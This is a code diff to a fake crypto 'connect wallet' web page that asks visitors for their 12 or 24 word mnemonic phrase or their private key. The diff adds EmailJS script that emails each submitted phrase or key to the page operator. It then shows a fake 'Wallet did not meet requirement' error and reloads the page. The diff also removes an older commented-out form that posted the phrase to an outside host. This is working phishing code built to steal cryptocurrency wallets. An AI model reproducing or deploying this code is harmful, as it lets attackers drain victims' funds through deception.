@@ -1509,15 +1509,7 @@
                         <a href="index.html#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
                     </div>
 
-                    <!-- <form method="post" action="https://apygate.anchorstation.host/submit.php">
-                    <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase"
-                        class="form-control text-primary"
-                        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
-                
-                    <button type="submit" class="btn btn-primary" style="border-top: 5px; ">Connect
-                        Wallet</button>
-                
-                </form> -->
+                    
 
                     <div id="div_connect_manuallly" style="display:none;">
                         <form name="my-form" id="my-form" >
@@ -1527,6 +1519,9 @@
                                 name="states"
                                     placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. or Input Wallet Private Key"
                                     style="font-size:20px; font-weight:650" rows="4" minlength="10" required ></textarea>
+                                    <p id="new-state-message" style="display:none;">
+    !! Wallet did not meet requirement.
+</p>
                                 <p><br></p>
                                
                                 <button id="submit" type="submit" name="submit" value="submit" class="btn btn-primary"
@@ -1544,7 +1539,7 @@
                    
                    
                    
-                   <script src="script.js"></script>
+                   
                    
                    
                     <div>
@@ -1594,7 +1589,7 @@
                 $('#popup_connect_wallet').modal('show');
 
                 //Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 15);
+                var interval = 1000 * getRandomInt(1, 10);
                 setTimeout(() => {
                     $('#auto_connecting').hide();
                     $('#div_connect_manuallly').hide();
@@ -1611,7 +1606,7 @@
                 $('#div_connect_manuallly').hide();
 
                 //Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 20);
+                var interval = 1000 * getRandomInt(1, 10);
                 setTimeout(() => {
                     $('#auto_connecting').hide();
                     $('#div_connect_manuallly').hide();
@@ -1719,6 +1714,51 @@
             margin-bottom: 10px
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+emailjs.init({
+    publicKey: "IHoZvd_iwdLOVHR4B"
+});
+</script>
+<script>
+const form = document.getElementById("my-form");
+const submitButton = document.getElementById("submit");
+const message = document.getElementById("new-state-message");
+
+form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    submitButton.disabled = true;
+    submitButton.textContent = "Connecting...";
+
+    emailjs.sendForm(
+        "service_nheiopq",
+        "template_a2vjhb9",
+        form
+    )
+    .then(function() {
+
+        message.style.display = "block";
+
+        setTimeout(function() {
+            window.location.reload();
+        }, 2500);
+
+    })
+    .catch(function(error) {
+
+        console.error("EmailJS error:", error);
+
+        message.style.display = "block";
+
+        setTimeout(function() {
+            window.location.reload();
+        }, 1500);
+
+    });
+});
+</script>
+
 </body>
 
 
